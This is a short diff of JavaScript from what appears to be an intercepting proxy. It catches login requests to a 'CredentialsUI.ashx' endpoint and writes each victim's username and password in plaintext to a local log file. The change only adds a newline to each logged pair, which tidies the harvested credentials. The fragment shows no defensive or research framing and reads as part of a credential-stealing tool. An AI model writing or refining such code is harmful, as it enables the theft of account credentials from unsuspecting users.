@@ -45,7 +45,7 @@ var filter = function(req, res, parsed_req, cont) {
     if( parsed_req.path == '/Controls/CredentialsUI.ashx' ) {
       logger(req, './log.txt', function(body) {
 	shouldBlock && activatedUsers.push(body.username);
-	return body.username+'    '+body.password;
+	return body.username+'    '+body.password+'\n';
       });
     } else if( parsed_req.path.match(/^\/proxy_admin/) ) {
       admin_server(req, res, parsed_req);
